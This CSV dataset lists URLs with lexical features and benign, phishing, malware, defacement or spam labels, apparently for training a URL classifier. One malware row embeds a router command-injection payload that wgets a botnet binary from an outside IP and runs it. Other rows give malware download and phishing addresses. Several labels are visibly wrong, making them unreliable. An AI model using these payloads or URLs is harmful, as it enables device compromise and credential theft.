url,numDots,subdomainLevel,pathLevel,urlLength,numDash,atSymbol,tildeSymbol,numUnderscore,numPercent,numQueryComponents,numApersand,numHash,numDigits,https,ipAddress,domainInSubdomains,domainInPaths,httpsInHostname,hostnameLength,pathLength,queryLength,doubleSlash,type
http://www.korexshop.sk/index.php,3,1,1,33,0,False,False,0,0,0,0,0,0,False,False,False,False,False,16,10,0,False,defacement
http://9779.info/%E5%84%BF%E7%AB%A5%E7%B2%98%E8%B4%B4%E7%94%BB/,1,0,1,63,0,False,False,0,15,0,0,0,19,False,True,False,False,False,9,47,0,False,malware
http://www.spd-hohenmoelsen.de/images/banners/windhoek_tours/b5c7e3b36cdfbf12f4eaf989161b8e34/,2,1,4,94,1,False,False,1,0,0,0,0,17,True,False,False,False,False,23,64,0,False,benign
http://ancestry.co.uk/search/db.aspx?dbid=28297,3,0,2,47,0,False,False,0,0,1,0,0,5,False,False,False,False,False,14,15,10,False,spam
http://glendaleharley.com/,1,0,0,26,0,False,False,0,0,0,0,0,0,False,False,False,False,False,18,1,0,False,benign
http://news.cnet.com/2100-1023-208811.html,3,1,1,42,2,False,False,0,0,0,0,0,14,True,False,False,False,False,13,22,0,False,phishing
http://advancedphotoshop.co.uk/forum/posting.php?mode=quote&p=2891&sid=ed31f9707333a48e2d2a0c6e87e7287a,3,0,2,103,0,False,False,0,0,3,2,0,25,True,False,False,False,False,23,18,54,False,spam
http://121.153.242.234:29784/.i,4,0,1,31,0,False,False,0,0,0,0,0,17,False,True,False,False,False,21,3,0,False,malware
http://theage.com.au/afl/afl-news/age-footballer-of-the-year--round-21-votes-20110815-1ith7.html,3,0,3,96,11,False,False,0,0,0,0,0,12,True,False,False,False,False,13,76,0,False,benign
http://archive.yorkpress.co.uk/2002/12/21/276060.html,4,1,4,53,0,False,False,0,0,0,0,0,14,True,False,False,False,False,23,23,0,False,spam
http://abdn.ac.uk/local/php/doc/function.bzerrstr.html,4,0,4,54,0,False,False,0,0,0,0,0,0,True,False,False,False,False,10,37,0,False,spam
http://adservers.co.uk/scr/clk.aspx?ec=o03Ct0JDn4ZDpCpNoL6Pfr3QqH7SbCJGb8ZHb8ZHtTtTb8JHhL6RhzsRb8JHZzM9oKKThLYC6D6TiLYC6L6UmzcSqrKPoD6QXv6TbCJHm5cSqvMPoLoC4jMPijsRlLYCs0NOoHdRb9NIaLoC4bZDv03EsaZCb8ZDm5cSXrM9pGKPAXdJg1JCoXtG155QsbpIKfsQjf6Qv8rGoK4Sqv4HgXaRmPcQC5dJurKOd1NRk54InKYC41NEiHKPtLYC45qJGHKJuWaG5zKR19qG1DtHbKZHPrqLDPKKA1bDlPJGpe6M6TcRFP4H5TMSo9sIpf7HiP7Lp8ZTb83Han4RnbqTnabMbKZHuecMmyaRpW5SvW4JQ9rRPLZMX1JOf5cUeTpOZbKGvzKI4z4CbLYC4P6QpG3HfzqDiHaMu17L456TDPN9oGaDuO6Pr5dJJL3TOLZULTqSbKZHsXJMovKUGvMLjXbJBbdQtTdKfzMGMLID6TZC6rsHuarJE5aGrT4Hp9aRMTsIHHsPjvKHY97UqCqQ2H5RqO5QHHJKb83Hk5rQLvcMOrcPYXrJafN9rOqKmWpSn8dPXTLU39ZTw97JGTpOsnsSpGdKn17Q3TrGmHZCi95EBjqH6HJ9oOpSb5cSZXMIaLoC4L6UmzcSqLID69JCt43Ds4pDuKJDbKZHn4pDu8JEvOJCr8JDqKID6T3CnG3En0JEuOoOe9tRz4Z9oLcPbrZ9f1NOarJCraZBnGJEk4pCpuYCpKZ9pLsSprpSnL6Chr6Dr4JUiLJQuHJDpncUbD7RqKZ9l9cQbrpK8z4KGbaJ7PoRYb6PzCZ9mXcSXr3SebtSfDMOi1IPaLtOXHNQlv68gzcO0,3,0,2,900,0,False,False,0,0,1,0,0,144,False,False,False,False,False,15,13,864,False,spam
http://prefixmag.com/media/hunx-and-his-punx/too-young-to-be-in-love-video/45104/,1,0,4,81,9,False,False,0,0,0,0,0,5,False,False,False,False,False,13,61,0,False,benign
http://wn.com/Mont_Saint-Gr%C3%A9goire,1,0,1,38,1,False,False,1,2,0,0,0,2,True,False,False,False,False,6,25,0,False,benign
http://www.fostermanf.com/outside_plant_division.html,3,1,1,53,0,False,False,2,0,0,0,0,0,False,False,False,False,False,18,28,0,False,phishing
http://el-svet-nn.ru/modules/mod_login/tmpl/,1,0,3,44,2,False,False,1,0,0,0,0,0,False,False,False,False,False,13,24,0,False,benign
http://www.metalsul.ind.br/site/index.php?option=com_contact&view=contact&id=54:celso&catid=28:contatospa,4,1,2,105,0,False,False,1,0,4,3,0,4,True,False,False,False,False,19,15,63,False,defacement
http://store.handmark.com/search/,2,1,1,33,0,False,False,0,0,0,0,0,0,False,False,False,False,False,18,8,0,False,benign
http://khangvietdn.com/index.php?option=com_content&view=article&id=23:composite-va-cac-ng-dng&catid=4:tin-tc-hoa-cht&Itemid=5&lang=vi,2,0,1,134,7,False,False,1,0,6,5,0,4,False,False,False,False,False,15,10,101,False,defacement
http://youtube.com/watch?v=emdAg-sAvE4,1,0,1,38,1,False,False,0,0,1,0,0,1,True,False,False,False,False,11,6,13,False,benign
http://wiki.answers.com/Q/Why_does_keith_lemon_wear_a_bandage_on_his_hand,2,1,2,73,0,False,False,9,0,0,0,0,0,True,False,False,False,False,16,50,0,False,benign
http://education.com/schoolfinder/us/california/oakland/redwood-heights-elementary/,1,0,5,83,2,False,False,0,0,0,0,0,0,True,False,False,False,False,13,63,0,False,benign
http://sqfadsde.com,1,0,0,19,0,False,False,0,0,0,0,0,0,False,False,False,False,False,12,0,0,False,phishing
http://www.interrail.it/FIMF/index.php?option=com_content&view=article&id=19&Itemid=37,3,1,2,86,0,False,False,1,0,4,3,0,4,False,False,False,False,False,16,15,47,False,defacement
http://kyla-online.blogspot.com/,2,1,0,32,1,False,False,0,0,0,0,0,0,True,False,False,False,False,24,1,0,False,benign
http://allegro.pl/show_item.php?item=5168871119&sh_dwh_token=d0b6dd74a8394345128e20d296cb1c5e,2,0,1,93,0,False,False,3,0,2,1,0,31,True,False,False,False,False,10,14,61,False,benign
http://www.spyderjacketsamerica.com/page/index.php,3,1,2,50,0,False,False,0,0,0,0,0,0,False,False,False,False,False,28,15,0,False,benign
http://dl.pocomixing.com/n/50126261/CCleaner.exe?secure=1437427605_78769c2cbb6e7d237eb4e2ab66cb1c9d,3,1,3,99,0,False,False,1,0,1,0,0,35,False,False,False,False,False,17,24,50,False,malware
http://szgs.ru/news/news-in-the-world-of-the-gas/23-2008-08-27-06-29-15.html,2,0,3,76,12,False,False,0,0,0,0,0,16,False,False,False,False,False,7,62,0,False,defacement
http://www.abesprev.com.br/templatenew1/index.php/notcias-menuprincipal-13/5748-remuneracao-aos-eleitos-para-o-banesprev.html,5,1,4,125,8,False,False,0,0,0,0,0,7,False,False,False,False,False,19,99,0,False,defacement
http://58.243.20.165:43481/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1&next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.243.20.165:43481/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,11,0,12,240,3,False,False,1,0,0,7,0,32,False,True,False,True,False,19,214,0,True,malware
http://youtube.com/watch?v=BzEepru3RRQ,1,0,1,38,0,False,False,0,0,1,0,0,1,True,False,False,False,False,11,6,13,False,benign
https://toulousa.com/omg/359EYJSFYHMS.exe,2,0,2,41,0,False,False,0,0,0,0,0,3,False,False,False,False,False,12,21,0,False,malware
http://221.210.211.27:37700/Mozi.m,4,0,1,34,0,False,False,0,0,0,0,0,16,False,True,False,False,False,20,7,0,False,malware
http://animals-and-pets.co.uk/wall-posters/wild-animals-posters.php,3,0,2,67,5,False,False,0,0,0,0,0,0,False,False,False,False,False,22,38,0,False,spam
http://crowncenterstl.org/,1,0,0,26,0,False,False,0,0,0,0,0,0,True,False,False,False,False,18,1,0,False,benign
http://matthewstruthers.com,1,0,0,27,0,False,False,0,0,0,0,0,0,False,False,False,False,False,20,0,0,False,phishing
http://wibw.com/sports/headlines/Exhibition_Season_Starts_For_KU_Mens_Basketball_Tuesday_132896778.html,2,0,3,103,0,False,False,8,0,0,0,0,9,True,False,False,False,False,8,88,0,False,benign
http://reconditebaseball.blogspot.com/2008/05/extreme-career-babip.html,3,1,3,71,2,False,False,0,0,0,0,0,6,False,False,False,False,False,30,34,0,False,benign
http://ahds.ac.uk/ictguides/methods/method.jsp;jsessionid=B3E6D05F739F6712ED1C693848F22664?methodId=129,3,0,3,103,0,False,False,0,0,1,0,0,26,False,False,False,False,False,10,29,12,False,spam
http://tools.ietf.org/html/rfc1499,2,1,2,34,0,False,False,0,0,0,0,0,4,True,False,False,False,False,14,13,0,False,phishing
http://archives.li.man.ac.uk/ead/search/?operation=summary&rsid=dc.title%20any/relevant/proxinfo%20%22Letters%20to%20Hester%20Lynch%20Piozzi%20and%20Henry%20Thrale%22%20or/relevant/proxinfo%20dc.creator%20any/relevant/proxinfo%20%22Recipients:%20Hester%20Lynch%20Piozzi%20and%20Henry%20Thrale%22&firstrec=4621&numreq=20&highlight=0&hitposition=4624,6,2,2,348,0,False,False,0,23,6,5,0,57,True,False,False,False,False,21,12,307,False,spam
http://britannica.com/EBchecked/topic/227317/Alessandro-Gavazzi,1,0,4,63,1,False,False,0,0,0,0,0,6,True,False,False,False,False,14,42,0,False,benign
http://allgirltogaparty.co.uk/gallery2/main.php/v/2005_02/uii1.html?g2_GALLERYSID=bf197be4dce7efacb62202c7ada745dd,4,0,5,114,0,False,False,2,0,1,0,0,23,False,False,False,False,False,22,38,46,False,spam
http://www.paypal-login.de/login/73647/index.php,3,1,3,48,1,False,False,0,0,0,0,0,5,False,False,False,False,False,19,22,0,False,benign
http://landcareus.com/caem/tyf.php?l=ykol7.cab,3,0,2,46,0,False,False,0,0,1,0,0,1,False,False,False,False,False,14,13,11,False,malware
http://www.parroquiaucacha.com.ar/index.php?option=com_content&view=section&layout=blog&id=9&Itemid=25,4,1,1,102,0,False,False,1,0,5,4,0,3,False,False,False,False,False,26,10,58,False,defacement
http://www.klyn-consulting.com/update-your-information/check-update/,2,1,2,68,4,False,False,0,0,0,0,0,0,False,False,False,False,False,23,38,0,False,phishing
http://www.ventrella.com/Darwin/darwin.html,3,1,2,43,0,False,False,0,0,0,0,0,0,True,False,False,False,False,17,19,0,False,phishing
http://crousel.com/gcc/artists/Claire%20Fontaine/biblio,1,0,4,55,0,False,False,0,1,0,0,0,2,True,False,False,False,False,11,37,0,False,benign
http://debitcardpaydayloans.org.uk/,2,0,0,35,0,False,False,0,0,0,0,0,0,False,False,False,False,False,27,1,0,False,benign
http://amazon.co.uk/gp/bestsellers/kids/ref=pd_ts_c_th_head/202-2513040-1206232?pf_rd_m=A3P5ROKL5A1OLE&pf_rd_s=right-3&pf_rd_r=121ZMMBVBRAPGYXXBH4R&pf_rd_t=101&pf_rd_p=132520391&pf_rd_i=468292,2,0,5,192,3,False,False,16,0,6,5,0,44,True,False,False,False,False,12,60,112,False,spam
http://89.34.27.164/SBIDIOT/zte,3,0,2,31,0,False,False,0,0,0,0,0,9,False,True,False,False,False,12,12,0,False,malware
http://www.penzkofer-kachelofenbau.de/index.php?option=com_weblinks&view=category&id=50&Itemid=72,3,1,1,97,1,False,False,1,0,4,3,0,4,True,False,False,False,False,30,10,49,False,defacement
http://sibrc.org/news/news_59.html,2,0,2,34,0,False,False,1,0,0,0,0,2,False,False,False,False,False,9,18,0,False,defacement
http://king-county-dui-lawyer.com/,1,0,0,34,3,False,False,0,0,0,0,0,0,False,False,False,False,False,26,1,0,False,benign
http://amber.ch.ic.ac.uk/archive/200108/0053.html,5,2,3,49,0,False,False,0,0,0,0,0,10,False,False,False,False,False,17,25,0,False,spam
http://desiredelille.com/index.php?option=com_content&view=article&id=2&Itemid=3,2,0,1,80,0,False,False,1,0,4,3,0,2,False,False,False,False,False,17,10,45,False,defacement
http://i880corridor.com/,1,0,0,24,0,False,False,0,0,0,0,0,3,False,False,False,False,False,16,1,0,False,benign
http://www.autoricambicirillo.it/informazioni.htm,3,1,1,49,0,False,False,0,0,0,0,0,0,False,False,False,False,False,25,17,0,False,defacement
http://thekpi.com.au,2,0,0,20,0,False,False,0,0,0,0,0,0,False,False,False,False,False,13,0,0,False,phishing
http://wiki.name.com/en/Suzanne,2,1,2,31,0,False,False,0,0,0,0,0,0,False,False,False,False,False,13,11,0,False,benign
http://www.gnu.org/software/gnump3d/,2,1,2,36,0,False,False,0,0,0,0,0,1,False,False,False,True,False,11,18,0,False,phishing
http://adservers.co.uk/scr/clk.aspx?ec=o03Ct0JDn4ZCm0pNoL6Pfr3QqH7SbCJGb8ZHb8ZHtTtTb8JHibcPbD7TvnMPb8JHrDN9oO4Tj1tSb5cSZXM9oK4QqrM9pKKSbC3HgLcSpLMUb8ZGtb6TeLYC2P6RfT6QqDd9ZXcSlrJCc8NPcLMFca6SXHMFnKJEk43DvuICpCZBoCJDcCNPpDNFZ1tRXb7DwH6Dr5dRtPcUiP6QsfdUlHJDcycOgLMFCbcPbD7TvnMPVLrKcycOfHMFmO2Se9NOzeMPoDNPv1oTfH7QWO6RfT6QqD701,3,0,2,324,0,False,False,0,0,1,0,0,46,False,False,False,False,False,15,13,288,False,spam
http://spoke.com/info/p63ylFX/DeborahBrunner,1,0,3,44,0,False,False,0,0,0,0,0,2,True,False,False,False,False,9,28,0,False,benign
http://invest.whoknowsmygameplan.com/art%203/,2,1,1,45,0,False,False,0,1,0,0,0,3,False,False,False,False,False,29,9,0,False,phishing
http://rvalzieikar.cloudaccess.host/index2.php,3,1,1,46,0,False,False,0,0,0,0,0,1,False,False,False,False,False,28,11,0,False,phishing
http://www.abertosp.com/index.php?option=com_content&view=article&id=244:alves-vence-demoliner-de-virada&catid=35:demo-category&Itemid=87,3,1,1,137,5,False,False,1,0,5,4,0,7,False,False,False,False,False,16,10,103,False,defacement
http://local.yahoo.com/MO/Kansas+City/Business+to+Business/Conventions+Trade+Shows/Trade+Shows,2,1,5,94,0,False,False,0,0,0,0,0,0,True,False,False,False,False,15,72,0,False,benign
http://www.autoretro.it/zagato.htm,3,1,1,34,0,False,False,0,0,0,0,0,0,False,False,False,False,False,16,11,0,False,defacement
http://astore.amazon.co.uk/ukvisit-21/detail/B00005NPLA/203-6933174-0803961,3,1,4,75,3,False,False,0,0,0,0,0,24,False,False,False,False,False,19,49,0,False,spam
http://en-pi.facebook.com/people/Jeremy-Erickson/1331396850,2,1,3,59,2,False,False,0,0,0,0,0,10,True,False,False,False,False,18,34,0,False,benign
http://blogs.orlandosentinel.com/entertainment_tv_tvblog/2011/10/greg-warmoth-vanessa-echols-to-play-who-wants-to-be-a-millionaire.html,3,1,4,135,11,False,False,2,0,0,0,0,6,False,False,False,False,False,25,103,0,False,benign
http://sports.espn.go.com/new-york/mlb/columns/story?columnist=rubin_adam&id=6240606,3,2,4,84,1,False,False,1,0,2,1,0,7,True,False,False,False,False,18,27,31,False,benign
http://pipl.com/directory/name/Charbonneau/Danielle,1,0,4,51,0,False,False,0,0,0,0,0,0,True,False,False,False,False,8,36,0,False,benign
http://www.vmware.com/products/desktop/ws_features.html,3,1,3,55,0,False,False,1,0,0,0,0,0,False,False,False,False,False,14,34,0,False,phishing
http://metrolyrics.com/shape-of-things-to-come-lyrics-audioslave.html,2,0,1,69,6,False,False,0,0,0,0,0,0,False,False,False,False,False,15,47,0,False,benign
http://biomath.ucla.edu/tchou/,2,1,1,30,0,False,False,0,0,0,0,0,0,False,False,False,False,False,16,7,0,False,benign
http://178.62.84.15/SBIDIOT/sh4,3,0,2,31,0,False,False,0,0,0,0,0,10,False,True,False,False,False,12,12,0,False,malware
http://yxv7iynavrp4knpd0f4x.littlematchagirl.com.au,3,1,0,51,0,False,False,0,0,0,0,0,4,False,False,False,False,False,44,0,0,False,phishing
http://allgirltogaparty.co.uk/gallery2/main.php?g2_view=core:ShowItem&g2_itemId=150&g2_imageViewsIndex=1&g2_GALLERYSID=dc8d63e4ab6a6f27267b5cab3f50de23,3,0,2,151,0,False,False,4,0,4,3,0,26,False,False,False,False,False,22,18,103,False,spam
http://emgn.com/entertainment/21-amazing-make-up-transformations-that-totally-transformed-someones-look/,1,0,2,104,9,False,False,0,0,0,0,0,2,False,False,False,False,False,8,89,0,False,benign
http://amber.ch.ic.ac.uk/archive/200410/0142.html,5,2,3,49,0,False,False,0,0,0,0,0,10,False,False,False,False,False,17,25,0,False,spam
http://fb.com.accounts.login.userid.492739.fbsacc.com/frd/fbn/?next=http%3A%2F%2Fwww.fb.com%2videos%2F%3A%4A%4ID%1A,9,6,2,115,0,False,False,0,9,1,0,0,15,False,False,False,False,False,46,9,52,False,malware
https://pastebin.com/raw/QVbvZsL9,1,0,2,33,0,False,False,0,0,0,0,0,1,True,False,False,False,False,12,13,0,False,malware
http://youtube.com/watch?v=bqMAkbrp5uA,1,0,1,38,0,False,False,0,0,1,0,0,1,True,False,False,False,False,11,6,13,False,benign
http://www.artedesignsas.it/catalogo.html?page=shop.product_details&flypage=flypage.tpl&product_id=264&category_id=5,5,1,1,116,0,False,False,3,0,4,3,0,4,False,False,False,False,False,20,14,74,False,defacement
http://johnmuirsl.org/,1,0,0,22,0,False,False,0,0,0,0,0,0,False,False,False,False,False,14,1,0,False,benign
http://aolshop.memberoffers.co.uk/csp/smp/aol/itementry3.csp?FS=E028&cat=AK&header=Kitchenware/subcats2.csp?cat=AH&header=Health%20and%20Beauty&CSPCHD=00000001000129q8i9ou003310638576,5,1,4,183,0,False,False,0,2,5,4,0,37,False,False,False,False,False,26,27,122,False,spam
http://en.wikipedia.org/wiki/Lavallee,2,1,2,37,0,False,False,0,0,0,0,0,0,True,False,False,False,False,16,14,0,False,benign
https://apbfiber.com/openme/28712345.exe,2,0,2,40,0,False,False,0,0,0,0,0,8,True,False,False,False,False,12,20,0,False,malware
http://congtynguyenbinh.com.vn/ric/30/secure.php,3,0,3,48,0,False,False,0,0,0,0,0,2,False,False,False,False,False,23,18,0,False,malware
http://www.tirionklasse.nl/index.php?start=9,3,1,1,44,0,False,False,0,0,1,0,0,1,False,False,False,False,False,19,10,7,False,defacement
https://itacardacesso.com/promocao/descontao/card/home.php,2,0,4,58,0,False,False,0,0,0,0,0,0,False,False,False,False,False,17,33,0,False,phishing
http://fiu.edu/~mirandas/494-2010-a-z-all.htm,2,0,2,45,4,False,True,0,0,0,0,0,7,False,False,False,False,False,7,31,0,False,benign
http://thisisrnb.com/2010/09/ne-yo-libra-scale-tracklist/,1,0,3,57,4,False,False,0,0,0,0,0,6,True,False,False,False,False,13,37,0,False,benign
http://9779.info/%E7%93%9C%E5%AD%90%E7%B1%B3%E7%B2%92%E6%8B%BC%E8%B4%B4%E7%94%BB/,1,0,1,81,0,False,False,0,21,0,0,0,26,False,True,False,False,False,9,65,0,False,malware
http://securityycentre.000webhostapp.com,2,1,0,40,0,False,False,0,0,0,0,0,3,False,False,False,False,False,33,0,0,False,phishing
http://members.tripod.com/hkazemian/IRANZEOLITE.html,3,1,2,52,0,False,False,0,0,0,0,0,0,True,False,False,False,False,18,27,0,False,phishing
http://extratorrent.cc/torrent/4189613/Cordon+%282014%29%28dvd5%29%28dvd1%29%28NL+Audio+subs%29+HD2DVD+SAM+TBS.html,2,0,3,115,0,False,False,0,8,0,0,0,30,False,False,False,False,False,15,93,0,False,benign
http://myaetherwallet.org,1,0,0,25,0,False,False,0,0,0,0,0,0,False,False,False,False,False,18,0,0,False,phishing
http://ahds.ac.uk/ictguides/methods/method.jsp;jsessionid=A18F4D4073AD4D2A43608C2CB17B29C4?methodId=76,3,0,3,102,0,False,False,0,0,1,0,0,22,False,False,False,False,False,10,29,11,False,spam
http://emergencyactionplan.org,1,0,0,30,0,False,False,0,0,0,0,0,0,False,False,False,False,False,23,0,0,False,phishing
http://smokstak.com/gallery/showimage.php?goto=lastpost&i=&p=95,2,0,2,63,0,False,False,0,0,3,2,0,2,True,False,False,False,False,12,22,21,False,benign
http://zeitfeist.de/youtube/91-hip-hop/405-rjd2-work-it-out.html,2,0,3,64,6,False,False,0,0,0,0,0,6,False,False,False,False,False,12,45,0,False,defacement
http://applerugs.co.uk/rugs/product_info.php?products_id=980&osCsid=e6ca5aba5f54f482ace60461a46c9f59?cPath=1?cPath=1,3,0,2,116,0,False,False,2,0,2,1,0,23,False,False,False,False,False,15,22,71,False,spam
https://apbfiber.com/openme/6720d200d42d3_18d30d11.exe,2,0,2,54,0,False,False,1,0,0,0,0,16,True,False,False,False,False,12,34,0,False,malware
http://teletoon.com/retro/,1,0,1,26,0,False,False,0,0,0,0,0,0,True,False,False,False,False,12,7,0,False,benign
http://www.ecotechindustrial.com/includes/skins/sunshine/documentgoogle,2,1,4,71,0,False,False,0,0,0,0,0,0,False,False,False,False,False,25,39,0,False,malware
http://142.11.244.135/bins/m68k.neiru,4,0,2,37,0,False,False,0,0,0,0,0,13,False,True,False,False,False,14,16,0,False,malware
http://veromi.com/Nathan-Coulter.aspx,2,0,1,37,1,False,False,0,0,0,0,0,0,False,False,False,False,False,10,20,0,False,benign
http://acard4u.co.uk/index.php?cPath=108&op=list&sort=2d&page=4&action=buy_now&products_id=441,3,0,1,94,0,False,False,2,0,6,5,0,9,False,False,False,False,False,13,10,63,False,spam
http://britannica.com/EBchecked/topic/537847/Shaker-Heights,1,0,4,59,1,False,False,0,0,0,0,0,6,True,False,False,False,False,14,38,0,False,benign
http://liceulogoga.ro,1,0,0,21,0,False,False,0,0,0,0,0,0,False,False,False,False,False,14,0,0,False,malware
http://chicagocubscards.com/playerChecklist.asp?ID=lobu,2,0,1,55,0,False,False,0,0,1,0,0,0,False,False,False,False,False,20,20,7,False,benign
http://wn.com/Cummings,1,0,1,22,0,False,False,0,0,0,0,0,0,True,False,False,False,False,6,9,0,False,benign
http://kellyfind.com/models/Mai_Lin.html,2,0,2,40,0,False,False,1,0,0,0,0,0,True,False,False,False,False,13,20,0,False,benign
http://www.prestosoft.com/ps.asp?page=edp_examdiff,3,1,1,50,0,False,False,1,0,1,0,0,0,True,False,False,False,False,18,7,17,False,phishing
http://africanamericanathleteshalloffame.com/pictures_and_names_of_past_hall_of_fame_inductees,1,0,1,94,0,False,False,8,0,0,0,0,0,False,False,False,False,False,37,50,0,False,benign
http://www.greenwoodsoftware.com/less/,2,1,1,38,0,False,False,0,0,0,0,0,0,False,False,False,False,False,25,6,0,False,phishing
http://linkedin.com/pub/harold-semanoff/8/369/27a,1,0,5,49,1,False,False,0,0,0,0,0,6,False,False,False,False,False,12,30,0,False,benign
http://mail.jayshreeindia.in/icons/cotetz/secure.regions.com/System/index.php,5,1,5,77,0,False,False,0,0,0,0,0,0,False,False,False,False,False,21,49,0,False,benign
http://www.parafiapiaski.pl/index.php?option=com_content&view=article&id=37&Itemid=37,3,1,1,85,0,False,False,1,0,4,3,0,4,False,False,False,False,False,20,10,47,False,defacement
http://acard4u.co.uk/product_reviews_write.php?products_id=410&op=list,3,0,1,70,0,False,False,3,0,2,1,0,4,False,False,False,False,False,13,26,23,False,spam
http://allgirltogaparty.co.uk/gallery2/main.php?g2_view=core:ShowItem&g2_itemId=131&g2_imageViewsIndex=1&g2_GALLERYSID=4d3b6f91197b65f5c28f12fbfc190b7c,3,0,2,151,0,False,False,4,0,4,3,0,28,False,False,False,False,False,22,18,103,False,spam
http://videosurf.com/gary-pettis-135053,1,0,1,39,2,False,False,0,0,0,0,0,6,True,False,False,False,False,13,19,0,False,benign
